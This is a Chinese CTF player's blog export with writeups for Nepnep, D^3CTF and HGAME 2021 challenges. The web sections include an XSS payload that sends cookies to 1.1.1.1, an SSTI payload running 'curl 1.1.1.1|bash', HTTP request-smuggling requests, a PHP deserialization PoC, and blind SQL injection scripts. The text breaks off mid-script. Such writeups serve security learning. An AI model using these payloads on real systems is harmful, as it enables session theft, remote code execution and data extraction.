{"meta":{"title":"明月归的小站","subtitle":"很菜的...","description":"记录一点一滴","author":"明月归","url":"http://www.moonback.xyz","root":"/"},"pages":[{"title":"关于","date":"2020-04-28T07:27:00.479Z","updated":"2020-04-28T07:27:00.479Z","comments":true,"path":"about/index.html","permalink":"http://www.moonback.xyz/about/index.html","excerpt":"","text":"关于本人一名喜欢网络安全的大学生，简单记录一下学习的过程！！！ 如有什么问题欢迎联系我QQ:3300162791 比赛经历 2020/02/29 合天御宅杯前20(记不清名次了) 2020/01/16-2020/02/14 Hgame 前100名(记不清具体名次了) 2019/12/22 河南省第一届金盾杯团队(凌晨三点半)第11名 2019/12/7 河南省高校网络安全技能联赛中原工学院站awd第1名"},{"title":"404 Not Found","date":"2019-10-16T15:28:25.962Z","updated":"2019-10-16T15:15:06.059Z","comments":true,"path":"404.html","permalink":"http://www.moonback.xyz/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"我的朋友们","date":"2020-10-03T05:28:30.405Z","updated":"2020-10-03T05:28:30.405Z","comments":true,"path":"friends/index.html","permalink":"http://www.moonback.xyz/friends/index.html","excerpt":"","text":"各位大佬想交换友链的话可以在下方留言，必须要有名称、头像链接、和至少一个标签哦～"},{"title":"","date":"2019-10-16T15:31:34.917Z","updated":"2019-10-16T15:31:34.917Z","comments":true,"path":"projects/index.html","permalink":"http://www.moonback.xyz/projects/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2019-10-16T15:38:25.385Z","updated":"2019-10-16T15:38:13.106Z","comments":true,"path":"tags/index.html","permalink":"http://www.moonback.xyz/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2019-12-18T09:59:37.502Z","updated":"2019-12-18T09:59:37.502Z","comments":true,"path":"blog/categories/index.html","permalink":"http://www.moonback.xyz/blog/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2019-10-16T15:38:25.385Z","updated":"2019-10-16T15:38:13.106Z","comments":true,"path":"blog/tags/index.html","permalink":"http://www.moonback.xyz/blog/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Nepnep欢乐赛2021部分writeup","slug":"Nepnep欢乐赛2021部分writeup","date":"2021-03-21T07:13:55.000Z","updated":"2021-03-21T12:44:45.861Z","comments":true,"path":"2021/03/21/Nepnep欢乐赛2021部分writeup/","link":"","permalink":"http://www.moonback.xyz/2021/03/21/Nepnep%E6%AC%A2%E4%B9%90%E8%B5%9B2021%E9%83%A8%E5%88%86writeup/","excerpt":"记一下","text":"记一下 weblittle_trick1234567891011 &lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&#x27;nep&#x27;]; $len = $_GET[&#x27;len&#x27;]; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123; eval(substr($nep,0,$len)); &#125;else&#123; die(&#x27;too long!&#x27;); &#125;?&gt; 看下substr函数手册 就变成了长度为11的代码执行 payload: 1?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;sleep 3 无回显命令执行 直接反弹shell bbxhh_revenge简单的PHP序列化12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 &lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; die(&#x27;success register admin&#x27;); &#125;else&#123; die(&#x27;please register admin &#x27;); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123; @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125; 读shell.php 构造poc 1234567891011121314151617181920212223242526 &lt;?phpclass Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;admin&#x27;; $this-&gt;password=&#x27;admin&#x27;; $this-&gt;register = &#x27;admin&#x27;; $this-&gt;file = new Open; $this-&gt;filename = &#x27;shell&#x27;; $this-&gt;content = &#x27;123&#x27;; &#125;&#125;class Open&#123;&#125; $a = new Game();echo urlencode(base64_encode(serialize($a))); shell.php 123456789101112&lt;?phpfunction shell($cmd)&#123; if(strlen($cmd)&lt;10)&#123; if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123; die(&quot;NO&quot;); &#125;else&#123; return system($cmd); &#125; &#125;else&#123; die(&#x27;so long!&#x27;); &#125;&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"D^3CTF2021部分题目writeup","slug":"D-3CTF2021部分题目writeup","date":"2021-03-06T06:13:13.000Z","updated":"2021-03-06T12:51:21.556Z","comments":true,"path":"2021/03/06/D-3CTF2021部分题目writeup/","link":"","permalink":"http://www.moonback.xyz/2021/03/06/D-3CTF2021%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"闲来无事 打一下！","text":"闲来无事 打一下！ web8-bit pubnode题目 有源码 首先要想办法有admin的session 看到有session-file-store模块 有可能session伪造 但是没有满足条件： 任意文件读取或者文件上传 通过爆破或者是配置文件泄露获得session的签名 sql二次注入 注册和登陆部分关键源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const sql = require(&quot;../utils/db.js&quot;);module.exports = &#123; signup: function (username, password, done) &#123; sql.query( &quot;SELECT * FROM users WHERE username = ?&quot;, [username], function (err, res) &#123; if (err) &#123; console.log(&quot;error: &quot;, err); return done(err, null); &#125; if (!res.length) &#123; sql.query( &quot;INSERT INTO users VALUES (?, ?)&quot;, [username, password], function (err, res) &#123; if (err) &#123; console.log(&quot;error: &quot;, err); return done(err, null); &#125; else &#123; return done(null, res.insertId); &#125; &#125; ); &#125; else &#123; return done(&#123; message: &quot;Username already taken.&quot; &#125;, null); &#125; &#125;); &#125;, signin: function (username, password, done) &#123; sql.query( &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;, [username, password], function (err, res) &#123; if (err) &#123; console.log(&quot;error: &quot;, err); return done(err, null); &#125; else &#123; return done(null, res); &#125; &#125; ); &#125;,&#125;; 这里使用占位符的形式进行执行sql语句 相当于进行了一次转义 注册用户 1admin&#39;||1# non RCE?java题目","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"HGAME2020部分writeup","slug":"HGAME2021部分writeup","date":"2021-01-30T14:07:15.000Z","updated":"2021-03-02T06:06:14.626Z","comments":true,"path":"2021/01/30/HGAME2021部分writeup/","link":"","permalink":"http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/","excerpt":"lai来了来了","text":"lai来了来了 week1webHitchhiking_in_the_Galaxy伪造http请求信息 watermelon控制台修改random函数 1Math.random &#x3D; function () &#123; return 10000 &#125; 找到这串 12345gameOverShowText: function (e, t) &#123; if(e &gt; 1999)&#123; alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;)) &#125;&#125;, base64解码就得到flag了 宝藏走私者http走私 详情参考：https://paper.seebug.org/1048/ 最终构造的请求头 1234567891011GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.siteContent-Length: 72Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Host: thief.0727.siteClient-IP: 127.0.0.1 智商检测鸡exp: 1234567891011121314151617181920212223242526272829303132333435363738import requestsfrom bs4 import BeautifulSoupimport timeimport jsonfrom scipy import integratefrom decimal import Decimalburp0_url = &quot;http://r4u.top:5000/api/getQuestion&quot;burp1_url = &quot;http://r4u.top:5000/api/verify&quot;burp2_url = &quot;http://r4u.top:5000/api/getFlag&quot;s = requests.session()while 1: r = s.get(burp0_url) if &quot;all have done!&quot; in r.text: break js = json.loads(r.text) print(js) soup = BeautifulSoup(js[&quot;question&quot;],&quot;html.parser&quot;) min_symbol = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(2) &gt; mo:nth-child(1)&quot;)[0].get_text() min_num = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(2) &gt; mn:nth-child(2)&quot;)[0].get_text() max_num = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; msubsup:nth-child(1) &gt; mrow:nth-child(3) &gt; mn:nth-child(1)&quot;)[0].get_text() x_num = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mn:nth-child(3)&quot;)[0].get_text() # mid_symbol = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mo:nth-child(5)&quot;)[0].get_text() static_num = soup.select(&quot;math:nth-child(1) &gt; mrow:nth-child(1) &gt; mn:nth-child(6)&quot;)[0].get_text() print(min_symbol,min_num,max_num,x_num,static_num) start = int(min_symbol+min_num) stop = int(max_num) x_num = int(x_num) static_num = int(static_num) def func(x): return x_num*x+static_num fArea,err = integrate.quad(func,start,stop) fArea = Decimal(fArea).quantize(Decimal(&quot;0.1&quot;), rounding = &quot;ROUND_HALF_UP&quot;) print(&quot;Integral area:&quot;,fArea) burp0_json = &#123;&quot;answer&quot;: fArea&#125; q = s.post(burp1_url,json=burp0_json) print(q.text)print(s.get(burp2_url).text) 走私者的愤怒构造CL-CL 123456789101112GET &#x2F; HTTP&#x2F;1.1Host: police.liki.linkConnection: keep-aliveContent-Length: 71Content-Length: 31GET &#x2F;secret HTTP&#x2F;1.1Host: police.liki.linkClient-IP: 127.0.0.1 可以出现两个400 构造CL-TE 123456789101112GET / HTTP/1.1Host: police.liki.linkContent-Length: 3Transfer-Encoding: chunked1GET /secret HTTP/1.1Host: police.liki.linkClient-IP: 127.0.0.1Content-Length: 3 没反应 后来才知道 不能为1要是0 且最后要有回车换行 payload 12345678910111213GET / HTTP/1.1Host: police.liki.linkContent-Length: 94Transfer-Encoding: chunked0GET /secret HTTP/1.1Host: police.liki.linkClient-IP: 127.0.0.1Content-Length: 3 自己构造的其它失败payload: 1234567891011121314151617181920212223242526272829303132333435363738printf &#x27;GET / HTTP/1.1\\r\\n&#x27;\\&#x27;Host: police.liki.link\\r\\n&#x27;\\&#x27;aa: \\0bb\\r\\n&#x27;\\&#x27;GET /secret HTTP/1.1\\r\\n&#x27;\\&#x27;Host: police.liki.link\\r\\n&#x27;\\&#x27;Client-IP: 127.0.0.1\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\| nc police.liki.link 80printf &#x27;GET / HTTP/1.1\\r\\n&#x27;\\&#x27;Host: thief.0727.site\\r\\n&#x27;\\&#x27;aa: \\0bb\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\&#x27;GET /secret HTTP/1.1\\r\\n&#x27;\\&#x27;Host: 127.0.0.1\\r\\n&#x27;\\&#x27;Client-IP:127.0.0.1\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\| nc thief.0727.site 80printf &#x27;GET / HTTP/1.1\\r\\n&#x27;\\&#x27;Host: police.liki.link\\r\\n&#x27;\\&#x27;aa: \\0bb\\r\\n&#x27;\\&#x27;GET http://police.liki.link/secret HTTP/1.1\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\&#x27;GET /secret HTTP/1.1\\r\\n&#x27;\\&#x27;Host: police.liki.link\\r\\n&#x27;\\&#x27;Client-IP: 127.0.0.1\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\| nc police.liki.link 80printf &#x27;GET / HTTP/1.1\\r\\n&#x27;\\&#x27;Host: police.liki.link\\r\\n&#x27;\\&#x27;aa: \\0bb\\r\\n&#x27;\\&#x27;GET http://police.liki.link/secret HTTP/1.1\\r\\n&#x27;\\&#x27;\\r\\n&#x27;\\| nc police.liki.link 80 POST请求的payload 12345678910111213141516POST / HTTP/1.1Host: police.liki.linkContent-Length: 104Transfer-Encoding: chunked0POST /secret HTTP/1.1Host: police.liki.linkClient-IP: 127.0.0.1Content-Length: 20233 其实就比之间的多加了Content-Length miscBase全家福base64 + base32 + hex 不起眼压缩包的养成的方法binwalk分离出个压缩包 提示密码为图片id 搜了半天没搜到 直接爆破吧 密码 170415155 解压出来 明文攻击 这里推荐使用2345好压先查看算法 发现是zipcrypto store 使用7z压缩 1C8uvP$DP 解压之后hxd打开发现 解实体编码得到flag Galaxywireshark导出http对象 有张png图片 改大小就行 Word RE:MASTERfirst.docx改成压缩包 在word/password.xml里找到 brainfuck编码的东西 解码：https://tool.bugku.com/brainfuck/ 得到 1DOYOUKNOWHIDDEN? 是另外一个word的密码 隐藏文字 下面的并不是全部都是一种字符 提示雪 猜测snow隐写 下载地址： http://www.darkside.com.au/snow/ 用格式刷去掉下面的线 复制出来保存文本中 使用下面命令 不指定密码得到flag 1SNOW.EXE -C 1.txt cryptoまひと摩斯密码 用这个解 http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx 接着ascii转字符串 123456s= [86,109,108,110,90,87,53,108,99,109,85,116,84,71,108,114,97,84,112,57,86,109,116,116,100,107,112,105,73,84,70,89,100,69,70,52,90,83,70,111,99,69,48,120,101,48,48,114,79,88,104,120,101,110,74,85,84,86,57,79,97,110,53,106,85,109,99,48,101,65,61,61]print(len(s))flag=&#x27;&#x27;for j in s: flag+=chr(j)print(flag) 得到 1VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA&#x3D;&#x3D; base64解码得到 1Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x 维吉尼亚密码 密钥为Liki 1&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n 栅栏密码 栏数为6 N型 拼凑格式成 &#125;xxxxxxxxxxx&#123;xxxxx 1&#125;!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp&#123;rzntu 逆序 1utnzr&#123;pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!&#125; 凯撒密码 1hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125; 对称之美12345678910import randomimport stringimport itertoolsfrom secret import FLAGkey = &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=16))cipher = bytes([ord(m)^ord(k) for m, k in zip(FLAG, itertools.cycle(key))])print(cipher) 搜了半天 找到个xortools 不过没啥用: https://blog.gpx.moe/2020/02/17/SJTU-CTF-2019-WriteUp-Crypto/ 后来看wp才知道是MTP：https://github.com/CameronLonsdale/MTP 这是啥玩意？ 分成16一组 12345678cipher=b&#x27;&#x27;length = len(cipher)t = length // 16f = open(&quot;cipher.ciphertexts&quot;, &quot;w&quot;)for i in range(0, t): print(cipher[i * 16 : (i + 1) * 16].hex(), file=f)print(cipher[t * 16 : -1].hex(), file=f)f.close() 明文是一段包含flag的英文文献 Transformerquipqiup直接解：https://quipqiup.com/ 不知道其它附件有啥用 在后面加上2021就行 repypy参考: https://www.yuque.com/cyberangel/vqcmca/vms5ep https://www.yuque.com/cyberangel/rg9gdm/vebs87 https://docs.python.org/3/library/dis.html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495 4 0 LOAD_GLOBAL 0 (input) 2 LOAD_CONST 1 (&#x27;give me your flag:\\n&#x27;) 4 CALL_FUNCTION 1 6 STORE_FAST 0 (raw_flag) 5 8 LOAD_GLOBAL 1 (list) 10 LOAD_FAST 0 (raw_flag) 12 LOAD_CONST 2 (6) 14 LOAD_CONST 3 (-1) 16 BUILD_SLICE 2 18 BINARY_SUBSCR 20 CALL_FUNCTION 1 22 STORE_FAST 1 (cipher) 6 24 LOAD_GLOBAL 2 (len) 26 LOAD_FAST 1 (cipher) 28 CALL_FUNCTION 1 30 STORE_FAST 2 (length) 8 32 LOAD_GLOBAL 3 (range) 34 LOAD_FAST 2 (length) 36 LOAD_CONST 4 (2) 38 BINARY_FLOOR_DIVIDE 40 CALL_FUNCTION 1 42 GET_ITER &gt;&gt; 44 FOR_ITER 54 (to 100) 46 STORE_FAST 3 (i) 9 48 LOAD_FAST 1 (cipher) 50 LOAD_CONST 4 (2) 52 LOAD_FAST 3 (i) 54 BINARY_MULTIPLY 56 LOAD_CONST 5 (1) 58 BINARY_ADD 60 BINARY_SUBSCR 62 LOAD_FAST 1 (cipher) 64 LOAD_CONST 4 (2) 66 LOAD_FAST 3 (i) 68 BINARY_MULTIPLY 70 BINARY_SUBSCR 72 ROT_TWO 74 LOAD_FAST 1 (cipher) 76 LOAD_CONST 4 (2) 78 LOAD_FAST 3 (i) 80 BINARY_MULTIPLY 82 STORE_SUBSCR 84 LOAD_FAST 1 (cipher) 86 LOAD_CONST 4 (2) 88 LOAD_FAST 3 (i) 90 BINARY_MULTIPLY 92 LOAD_CONST 5 (1) 94 BINARY_ADD 96 STORE_SUBSCR 98 JUMP_ABSOLUTE 44 12 &gt;&gt; 100 BUILD_LIST 0 102 STORE_FAST 4 (res) 13 104 LOAD_GLOBAL 3 (range) 106 LOAD_FAST 2 (length) 108 CALL_FUNCTION 1 110 GET_ITER &gt;&gt; 112 FOR_ITER 26 (to 140) 114 STORE_FAST 3 (i) 14 116 LOAD_FAST 4 (res) 118 LOAD_METHOD 4 (append) 120 LOAD_GLOBAL 5 (ord) 122 LOAD_FAST 1 (cipher) 124 LOAD_FAST 3 (i) 126 BINARY_SUBSCR 128 CALL_FUNCTION 1 130 LOAD_FAST 3 (i) 132 BINARY_XOR 134 CALL_METHOD 1 136 POP_TOP 138 JUMP_ABSOLUTE 112 15 &gt;&gt; 140 LOAD_GLOBAL 6 (bytes) 142 LOAD_FAST 4 (res) 144 CALL_FUNCTION 1 146 LOAD_METHOD 7 (hex) 148 CALL_METHOD 0 150 STORE_FAST 4 (res) 16 152 LOAD_GLOBAL 8 (print) 154 LOAD_CONST 6 (&#x27;your flag: &#x27;) 156 LOAD_FAST 4 (res) 158 BINARY_ADD 160 CALL_FUNCTION 1 162 POP_TOP 164 LOAD_CONST 0 (None) 166 RETURN_VALUE # your flag: 30466633346f59213b4139794520572b45514d61583151576638643a 换源出来的代码： 12345678910raw_flag = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;cipher = list(raw_flag[6:-1])length = len(cipher)for i in range(0,length//2): cipher[2*i+1],cipher[i*2] = cipher[i*2],cipher[2*i+1]res = []for i in range(length): res.append(ord(cipher[i])^i)print(bytes(res).hex()) 就一个异或和换位 逆向脚本: 123456789101112131415hex_flag = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;.encode()res1 = []for i in range(0,len(hex_flag),2): res1.append(int(hex_flag[i:i+2],16))print(res1)res2 = []for i in range(len(res1)): res2.append(chr(res1[i]^i))print(res2)print(len(res2))res3 = res2for i in range(0,28//2): res3[2*i+1],res3[i*2] = res3[i*2],res3[2*i+1]print(res3)print(&#x27;&#x27;.join(res3)) week2webLazyDogR4Uwww.zip有源码 有个config.ini存放用户账号密码 MD5解不出来 一个用户的密码很奇怪 0e纯数字 这不就弱比较？不过好像没用到 关键点在 lazy.php： 123456789101112131415161718192021&lt;?php$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];// 直接注册所有变量，这样我就能少打字力，芜湖~foreach(array(&#x27;_GET&#x27;,&#x27;_POST&#x27;) as $_request)&#123; foreach ($$_request as $_k =&gt; $_v)&#123; foreach ($filter as $youBadBad)&#123; $_k = str_replace($youBadBad, &#x27;&#x27;, $_k); &#125; $&#123;$_k&#125; = $_v; &#125;&#125;// 自动加载类，这样我也能少打字力，芜湖~function auto($class_name)&#123; require_once $class_name . &quot;.php&quot;;&#125;spl_autoload_register(&#x27;auto&#x27;); 这里将GET POST的值全部声明成了变量 并且过滤SESSION只是替换为空 完全可以双写绕过 得到flag的条件 flag.php: payload: 1?_SESSESSIONSION[username]&#x3D;admin Liki的生日礼物bp intruder一开 谁都不爱 不太懂 就理解成条件竞争吧 20线程 每次兑三个 Post to zuckonitxss题目 测了下 发现碰到一些关键字会反转并替换标签 img标签不会反转 并且过滤了http 最终构造payload： 1&gt;&quot;eikooc.tnemucod+&#x27;?/0009:1.1.1.1//:pt&#x27;+&#x27;th&#x27;=noitacol.tnemucod&quot;=rorreno &quot;onerror/&quot;=crs gmi&lt; 反转过来就是 onerror是为了触发反转 1&lt;img src=&quot;/rorreno&quot; onerror=&quot;document.location=&#x27;ht&#x27;+&#x27;tp://1.1.1.1:9000/?&#x27;+document.cookie&quot;&gt; http过滤使用字符串拼接 接收到token 带上访问/flag就行 200OK!!bool盲注 将from 空格 select where等替换为空 双写绕过 这里有个技巧 不知道替换了哪些关键字 只需在substr里加上 比对跑出来的结果就行 1234567891011121314151617181920212223242526272829303132333435363738import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)url=&quot;https://200ok.liki.link/server.php&quot;flag=&#x27;&#x27;for i in range(1,1000): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 headers1=&#123;&#x27;Status&#x27;:&quot;1&#x27; &amp;&amp; if(ascii(substr((selselectect/**/*/**/frfromom/**/week2sqli.f1111111144444444444g),&#123;&#125;,1))=&#123;&#125;,1,0) || &#x27;&quot;.format(str(i),str(mid))&#125; headers2=&#123;&#x27;Status&#x27;:&quot;1&#x27; &amp;&amp; if(ascii(substr((selselectect/**/*/**/frfromom/**/week2sqli.f1111111144444444444g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) || &#x27;&quot;.format(str(i),str(mid))&#125; try: r1=requests.get(url,headers=headers1,verify=False) print(i,mid) if &#x27;NETWORK ERROR&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url,headers=headers2,verify=False) if &quot;NETWORK ERROR&quot; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: breakprint(flag)# 5.7.30-0ubuntu0.18.04.1-log# information_schema,mysql,performance_schema,sys,week2sqli# admin,ctf,mysql.session,mysql.sys,root# ,,,*B5C6150DA828591E9B8C7A5F85FDE7855CE0B52B,*59419F0BF653D69723310B90585B040F3D434A23# f1111111144444444444g,status# ffffff14gggggg 扫目录发现database.php和phpmyadmin 注mysql库 注意mysql5.7 密码字段更改为authentication_string 解不出来 淦 老实的注就出了 miscTools两个文件7z和jpg 7z文件名提示F5隐写 空密码不行 在图片备注里找到密码 1java Extract Matryoshka.jpg -p &quot;!LyJJ9bi&amp;M7E72*JyD&quot; 提取出来7z密码 解压出来01.jpg残损二维码和另外一个Steghide.7z 同样在备注里有Steghide密码 1steghide extract -sf 01.jpg 分离出01.jpg和Outguess.7z 同样在备注里有Outguess密码 1.&#x2F;outguess -k &quot;z0GFieYAee%gdf0%lF&quot; -r 02.jpg hidden.txt 继续解压得到03.jpg和JPHS.7z 同样在备注里有JPHS密码 使用工具提取就行 四张残缺二维码已经齐了 mspaint打开画图最后拼出来 HallucigeniaStegslove分析出 扫描之后 得到一串字符串base64解码之后发现是 最后面的GNP反过来不就是png吗？写个脚本转换下 12345import base64s = &#x27;gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=&#x27;with open(&#x27;1.png&#x27;, &#x27;wb&#x27;) as f: f.write(base64.b64decode(s)[::-1]) 得到 直接垂直翻转就行 DNS流量包 http请求有发向flag.hgame2021.cf 访问 SPF的完整意思为 “Sender Policy Framework”。翻译过来就是发送方策略框架，是一项跟 DNS 相关的技术，它的内容写在 DNS 的 txt 类型记录里面 只需查询域名的txt记录就行 Telegraph：1601 6639 3459 3134 0892在频谱图里找到850Hz字样 不知道有啥用 听了一遍 发现有电报音 用这个网站可以听出来：https://morsecode.world/international/decoder/audio-decoder-adaptive.html 多试几遍 比对一下 cryptoWhitegiveRSA123N &#x3D; 882564595536224140639625987659416029426239230804614613279163e &#x3D; 65537c &#x3D; 747831491353896780365654517748216624798517769637260742155527 N知道了 factordb分解出p q http://www.factordb.com/ 12p &#x3D; 857504083339712752489993810777q &#x3D; 1029224947942998075080348647219 exp: 1234567891011import gmpy2import libnumc = 747831491353896780365654517748216624798517769637260742155527e = 65537N = 882564595536224140639625987659416029426239230804614613279163p = 857504083339712752489993810777q = 1029224947942998075080348647219d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, N)print(libnum.n2s(m)) gcd or more?12345678910from libnum import *from secret import FLAGp = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271n = p * qcipher = pow(s2n(FLAG), 2, n)print(cipher)# 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539 e=2 radin 不太懂 12345678910111213141516171819202122import libnumimport gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s print((r, rr, s, ss)) return ssp = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271c = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539# print(rabin_decrypt(c,p,q,2))print(libnum.n2s(rabin_decrypt(c,p,q,2))) signinSchmidt-Samoa cryptosystem https://blog.csdn.net/zhang14916/article/details/106597866 week3webForgetful标题那里ssti p神的payload 一把梭 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;curl 1.1.1.1|bash&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Liki-Jailsql注入 也没啥难度 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)proxies=&#123; &quot;https&quot;:&quot;127.0.0.1:8080&quot;&#125;url=&quot;https://jailbreak.liki.link/login.php&quot;flag=&#x27;&#x27;for i in range(1,1000): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 # data1=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; # data2=&#123;&quot;username&quot;: &quot;admin\\\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125; # data1=&#123;&quot;username&quot;: 